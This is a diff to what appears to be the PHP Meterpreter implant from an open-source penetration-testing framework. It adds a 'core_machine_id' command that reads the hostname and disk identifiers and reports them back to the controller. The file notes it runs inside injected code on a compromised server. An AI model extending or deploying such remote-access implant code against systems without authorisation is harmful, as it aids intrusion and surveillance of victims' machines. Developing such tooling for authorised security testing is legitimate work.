@@ -1,4 +1,4 @@
-#<?php
+//<?php
 
 # Everything that needs to be global has to be made so explicitly so we can run
 # inside a call to create_user_func($user_input);
@@ -32,7 +32,7 @@ if (!isset($GLOBALS['readers'])) {
 
 # global list of extension commands
 if (!isset($GLOBALS['commands'])) {
-    $GLOBALS['commands'] = array("core_loadlib", "core_uuid");
+    $GLOBALS['commands'] = array("core_loadlib", "core_machine_id", "core_uuid");
 }
 
 function register_command($c) {
@@ -432,6 +432,37 @@ function core_uuid($req, &$pkt) {
 }
 
 
+function get_hdd_label() {
+  foreach (scandir('/dev/disk/by-id/') as $file) {
+    foreach (array("ata-", "mb-") as $prefix) {
+      if (strpos($file, $prefix) === 0) {
+        return substr($file, strlen($prefix));
+      }
+    }
+  }
+  return "";
+}
+
+function core_machine_id($req, &$pkt) {
+  my_print("doing core_machine_id");
+  $machine_id = gethostname();
+  $serial = "";
+
+  if (is_windows()) {
+    # TODO: need help from real PHP folks who know how to do
+    # things via the Windows API. We need to:
+    # 1) get the system volume
+    # 2) get the volume information for that volume.
+    # 3) get the serial number from the extracted volume info.
+    # 4) create a serial in the format:
+    # "{0:04x}-{1:04x}".format((serial_num >> 16) & 0xFFFF, serial_num & 0xFFFF)
+  } else {
+    $serial = get_hdd_label();
+  }
+
+  packet_add_tlv($pkt, create_tlv(TLV_TYPE_MACHINE_ID, $serial.":".$machine_id));
+  return ERROR_SUCCESS;
+}
 
 
 ##
